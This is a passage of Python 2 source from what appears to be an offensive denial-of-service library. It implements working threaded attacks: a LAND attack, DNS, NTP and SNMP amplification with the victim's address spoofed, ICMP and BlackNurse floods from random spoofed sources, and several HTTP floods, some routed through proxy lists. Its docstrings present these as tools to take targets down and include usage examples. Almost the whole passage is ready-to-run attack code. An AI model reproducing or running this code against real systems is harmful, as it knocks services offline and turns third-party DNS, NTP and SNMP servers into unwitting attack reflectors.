 maxttl=maxi
 global minttl
 minttl=low
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   udpsp().start()
class ln(threading.Thread):
 def run(self):
  global counter
  while True:
   if winds=='null':
     windf=0
   if winds=="random":
     windf=random.randint(0,65535)
   try:
    if tcpf==True:
     msg=''
     req='TCP'
     for x in range(random.randint(1*amp,3*amp)):
      msg+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
     if len(msg)>1400:
      msg=msg[0:1400]
    else:
     pths=random.choice(paths)
     for l in range(random.randint(1,5)):
      ed=random.choice(ec)
      oi=random.randint(1,3)
      if oi==2:
       gy=0
       while gy<1:
         df=random.choice(ec)
         if df!=ed:
          gy+=1
       ed+=', '
       ed+=df
      l=random.choice(al)
      for n in range(random.randint(0,5)):
       l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
      kl=random.randint(1,2)
      if kl==1:
       req="GET"
       msg='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
      else:
       req="POST"
       k=''
       for _ in range(1,random.randint(2,5)):
        k+=random.choice(lis)
       k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
       for _ in range(1,random.randint(1,3)):
        k+=random.choice(lis)
       j=''
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)
       par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
       msg= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths,random.choice(ua),l,random.randint(300,1000),len(par),target,par)
    if paylo==False:
     msg=''
    packet = IP(ttl=random.randint(minttl,maxttl),src=target, dst=target)/TCP(window=windf,sport=port,dport=port)/msg
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(target,port))
    counter+=1
    print"[!]Packets: {} | Type: {} | Bytes: {}".format(counter,req,len(packet)) 
    time.sleep(.1)
   except Exception as e:
    pass
def land(u,p=80,threads=100,low=64,maxi=64,ampli=15,tcp=False,payloads=False,window="random"):
 '''
   this function is for LAND attack in which we are spoofing the victim's IP and targeted port.
'''
 global target
 target=u
 global port
 port=p
 global amp
 if ampli<1:
  ampli=1
 if ampli>15:
  ampli=15
 amp=ampli
 global maxttl
 maxttl=maxi
 global minttl
 minttl=low
 global tcpf
 tcpf=tcp
 global paylo
 paylo=payloads
 global winds
 winds=window
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   ln().start()
class dampli(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    ip=random.choice(dnsl)
    packet= IP(src=target, dst=ip)/UDP(sport=random.randint(1025,65500),dport=53)/DNS(rd=1L, qd=DNSQR(qname=random.choice(domainl), qtype=query, qclass=quclass))
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(ip,53))
    counter+=1
    print "[!]Packets sent: {} | IP: {}".format(counter,ip)
   except Exception as e:
    pass
   time.sleep(.1)
def dnsamplif(u,dnslist=[],threads=100,q='ALL',cl='IN'):
 '''
   this function is for DNS amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   dnslist: your DNS servers list
   threads: (set by default to: 100)
   q: (set by default to: "ALL") query type
   cl: (set by default to: "IN") query's class

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.dnsamplif('8.8.8.8',dnslist=a)

'''
 global target
 target=u
 global dnsl
 dnsl=dnslist
 global query
 query=q
 global quclass
 quclass=cl
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   dampli().start()
class nampli(threading.Thread):
 def run(self):
  global counter
  data='\x17\x00\x02\x2a'+'\x00'*4
  while True:
   try:
    ip=random.choice(ntpl)
    packet=IP(src=target, dst=ip)/UDP(sport=random.randint(1025,65500),dport=123)/Raw(load=data)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(ip,123))
    counter+=1
    print "[!]Packets sent: {} | IP: {}".format(counter,ip)
   except Exception as e:
    pass
   time.sleep(.1)
def ntpamplif(u,ntplist=[],threads=100):
 '''
   this function is for NTP amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   dnslist: your NTP servers list
   threads: (set by default to: 100)

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.ntpamplif('8.8.8.8',ntplist=a)

'''
 global target
 target=u
 global ntpl
 ntpl=ntplist
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   nampli().start()
class snampli(threading.Thread):
 def run(self):
  global counter
  data= '\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'
  while True:
   try:
    ip=random.choice(snmpl)
    packet=IP(src=target, dst=ip)/UDP(sport=random.randint(1025,65500),dport=161)/Raw(load=data)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(ip,161))
    counter+=1
    print "[!]Packets sent: {} | IP: {}".format(counter,ip)
   except Exception as e:
    pass
   time.sleep(.1)
def snmpamplif(u,snmplist=[],threads=100):
 '''
   this function is for SNMP amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   dnslist: your SNMP servers list
   threads: (set by default to: 100)
  
   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.snmpamplif('8.8.8.8',snmplist=a)

'''
 global target
 target=u
 global snmpl
 snmpl=snmplist
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   snampli().start()
class icmpcl(threading.Thread):
 def run(self):
  global counter
  while True:
   data=''
   for x in range(random.randint(1*amp,3*amp)):
    data +=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
   if len(data)>1400:
    data=data[0:1400]
   try:
    packet=IP(ttl=random.randint(minttl,maxttl),dst=target)/ICMP()/data
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(target,port))
    counter+=1
    print "[!]Packets sent: {} | Bytes: {}".format(counter,len(data))
   except Exception as e:
    pass
   time.sleep(.1)
def icmp(u,p=80,ampli=15,low=64,maxi=64,threads=100):
 '''
   this function is for ICMP flood attack
'''
 global target
 target=u
 global port
 port=p
 global amp
 if ampli<1:
  ampli=1
 if ampli>15:
  ampli=15
 amp=ampli
 global maxttl
 maxttl=maxi
 global minttl
 minttl=low
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   icmpcl().start()
class icmpst(threading.Thread):
 def run(self):
  global counter
  while True:
   data=''
   for x in range(random.randint(1*amp,3*amp)):
    data +=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
   if len(data)>1400:
    data=data[0:1400]
   try:
    p=random.randint(1,5) 
    if p==1:
     ot=random.randint(1,9)
    elif p==2:
     ot=random.randint(11,126)
    elif p==3:
     ot=random.randint(128,171)
    elif p==4:
     ot=random.randint(173,191)
    elif p==5:
     ot=random.randint(193,223)
    sip=str(ot)+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))
    packet=IP(ttl=random.randint(minttl,maxttl),src=sip,dst=target)/ICMP()/data
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(target,port))
    counter+=1
    print "[!]Packets sent: {} | IP: {} | Bytes: {}".format(counter,sip,len(data))
   except Exception as e:
    pass
   time.sleep(.1)
def icmpstorm(u,p=80,ampli=15,low=64,maxi=64,threads=100):
 '''
   this function is for ICMP flood with spoofed sources
'''
 global target
 target=u
 global port
 port=p
 global amp
 if ampli<1:
  ampli=1
 if ampli>15:
  ampli=15
 amp=ampli
 global maxttl
 maxttl=maxi
 global minttl
 minttl=low
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   icmpst().start()
class blnu(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    p=random.randint(1,5) 
    if p==1:
     ot=random.randint(1,9)
    elif p==2:
     ot=random.randint(11,126)
    elif p==3:
     ot=random.randint(128,171)
    elif p==4:
     ot=random.randint(173,191)
    elif p==5:
     ot=random.randint(193,223)
    sip=str(ot)+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))
    packet=IP(ttl=random.randint(minttl,maxttl),src=sip,dst=target)/ICMP(type=3,code=3)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(target,port))
    counter+=1
    print "[!]Packets sent: {} | IP: {}".format(counter,sip)
   except Exception as e:
    pass
   time.sleep(.1)
def blacknurse(u,p=80,ampli=15,low=64,maxi=64,threads=100,payloads=False):
 '''
   this function is for "black nurse" attack
'''
 global target
 target=u
 global port
 port=p
 global amp
 if ampli<1:
  ampli=1
 if ampli>15:
  ampli=15
 amp=ampli
 global maxttl
 maxttl=maxi
 global minttl
 minttl=low
 global paylo
 paylo=payloads
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   blnu().start()
class gldn(threading.Thread):
 def run(self):
  global counter 
  while True:
   pa=random.choice(paths)
   try:
    conn = httplib.HTTPConnection(target, port, timeout=timeout)
    if method==1:
     req="GET"
     q=''
     for i in range(1,random.randint(2,15)):
      q+=random.choice(lis)
     p=''
     for i in range(1,random.randint(2,15)):
      p+=random.choice(lis)
     if '?' in pa:
      jo='&'
     else:
      jo='?' 
     pa+=jo+q+"="+p
     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000), 'Host': target}
     conn.request("GET", pa,headers=h)
    elif method==2:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      params =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(300,500))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      conn.request("POST",pa , params, headers)
    elif method==3:
     i=random.randint(1,2)
     if i==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in pa:
       jo='&'
      else:
       jo='?' 
      pa+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000), 'Host': target}
      conn.request("GET",pa,headers=h)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      params =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(300,500))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      conn.request("POST", pa, params, headers)
    counter+=1
    print'[!]Requests: {} | Type: {}'.format(counter,req)
   except Exception as e:
    pass
   time.sleep(.1)
def goldeneye(u,p=80,threads=700,meth=3,maxtime=5):
 '''
   this function is for goldeneye attack with more effective method that take down the targets and doesn't consume much of your resources! thr reason that the original script pushs too much on your device is the fact that it fabricate he useragents string, random ascii blocks and the http headers on its own for every single request at the same time, so as much as you use more threads it's going to use more of your resources. here i already provided it with more than 10k unique useragents outside all clases (no need to redeclare it inside the class' functions everytime and push on the memory) and just formating the values of the http headers and the ascii strings.

   it takes the same parameters as the other, but with extra one:

   meth: (set by default to: 1) you can choos the type of http flood you wantby setting it betweeen 1 and 3:
   1=>GET
   2=>POST
   3=>randomly: GET & POST

'''
 global target
 target=u
 global method
 method=meth
 global port 
 port=p
 global timeout
 timeout=maxtime
 for x in range(threads):
  t=gldn()
  t.start()  
class medu(threading.Thread):
 def run(self): 
  global counter
  try:
   while True:
     try:
      line=random.choice(httpp)
      ip=line.split(':')[0].split('=')[0]
      p=line.split(':')[1].split('=')[0]
      try:
       conn = httplib.HTTPConnection(ip, int(p),timeout=timeout)
       g=random.randint(1,2)
       if g==1:
        pa=random.choice(paths)
        q=''
        for i in range(1,random.randint(2,15)):
         q+=random.choice(lis)
        p=''
        for i in range(1,random.randint(2,15)):
         p+=random.choice(lis)
        if '?' in pa:
         jo='&'
        else:
         jo='?' 
         pa+=jo+q+"="+p
        conn.request("GET", 'http://'+target+pa)
        counter+=1
        print'[!]Bot: {} | Method: GET | Count: {}'.format(ip,counter)
       elif g==2:
         headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
         k=''
         for _ in range(1,random.randint(2,5)):
          k+=random.choice(lis)
         k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
         for _ in range(1,random.randint(1,3)):
          k+=random.choice(lis)
         j=''
         for x in range(0,random.randint(11,31)):
           j+=random.choice(lis)
         params =k+'='+(j*random.randint(100,300))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
         conn.request("POST", 'http://'+target+random.choice(paths), params, headers)
         counter+=1
         print'[!]Bot: {} | Method: POST | Count: {}'.format(ip,counter)
      except socket.error as e:
       if "refused" in str(e):
        httpp.remove(line)
        httplist.remove(line)
      time.sleep(.1)
     except Exception as x:
      time.sleep(.01)
  except Exception as ex:
   pass
class swi(threading.Thread):
 def run(self):
  global httpp
  while True:
   time.sleep(random.randint(minswitch,maxswitch))
   httpp=[]
   while True:
    r=random.choice(httplist)
    if (r not in httpp):
     httpp.append(r)
    if (len(httpp)>random.randint(minpr,maxpr)):
     break
def medusa(u,threads=500,httpl=None,maxtime=5,switching=True,maxprox=70,minprox=60,mint=40,maxt=60):
 '''
   this function is aversion of goldeneye tool that works with HTTP proxies only.
'''
 global target
 target=u
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global httpp
 for x in range(random.randint(minprox,maxprox)):
  httpp.append(random.choice(httplist))
 global timeout
 timeout=maxtime
 global maxswitch
 maxswitch=maxt
 global minswitch
 minswitch=mint
 global minpr
 minpr=minprox
 global maxpr
 maxpr=maxprox
 for x in range(threads):
  t = medu()
  t.start()
class dose(threading.Thread):
 def run(self):
  global counter 
  u=target
  host=u.split('://')[1].split('/')[0]
  while True:
   u=target
   try:
    if method==1:
     req="GET"
     q=''
     for i in range(1,random.randint(2,15)):
      q+=random.choice(lis)
     p=''
     for i in range(1,random.randint(2,15)):
      p+=random.choice(lis)
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+p
     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
     requests.get(u,headers=h,timeout=timeout)
    elif method==2:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)+str(random.randint(1,10000))
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)+str(random.randint(1,10000))
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      requests.post(u, data={k:j}, headers=h,timeout=timeout)
    elif method==3:
     i=random.randint(1,2)
     if i==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in u:
       jo='&'
      else:
       jo='?' 
      u+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
      requests.get(u,headers=h,timeout=timeout)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      requests.post(u, data={k:j}, headers=h,timeout=timeout)
    counter+=1
    print'[!]Requests: {} | Type: {}'.format(counter,req)
   except requests.exceptions.ReadTimeout:
    counter+=1
    print'[!]Requests: {} | Type: {}'.format(counter,req)
   except Exception as e:
    pass
   time.sleep(.1)
def doser(u,threads=700,meth=1,maxtime=5):
 '''
  this function is for doser.py attack tool which uses requests module instead of httplib.
'''
 global target
 target=u
 global method
 method=meth
 global timeout
 timeout=maxtime
 for x in range(threads):
  t=dose()
  t.start() 
class pdose(threading.Thread):
 def run(self):
  global counter 
  u=target
  host=u.split('://')[1].split('/')[0]
  while True:
   pr="http://"+random.choice(httplist)
   proxy={'http':pr,'https':pr}
   u=target
   try:
    if method==1:
     req="GET"
     q=''
     for i in range(1,random.randint(2,15)):
      q+=random.choice(lis)
     p=''
     for i in range(1,random.randint(2,15)):
      p+=random.choice(lis)
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+p
     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
     requests.get(u,headers=h,proxies=proxy,timeout=timeout)
    elif method==2:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)+str(random.randint(1,10000))
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)+str(random.randint(1,10000))
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=timeout)
    elif method==3:
     i=random.randint(1,2)
     if i==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in u:
       jo='&'
      else:
       jo='?' 
      u+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
      requests.get(u,headers=h,proxies=proxy,timeout=timeout)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=timeout)
    counter+=1
    print'[!]Requests: {} | Type: {} | Bot: {}'.format(counter,req,pr.split('://')[1].split(':')[0])
   except requests.exceptions.ReadTimeout:
    counter+=1
    print'[!]Requests: {} | Type: {}'.format(counter,req)
   except Exception as e:
    pass
   time.sleep(.1)
def proxdoser(u,threads=700,httpl=None,meth=1,maxtime=5):
 '''
   this is the advanced version of doser.py using http proxies.
'''
 global target
 target=u
 global method
 method=meth
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global timeout
 timeout=maxtime
 for x in range(threads):
  t=pdose()
  t.start()
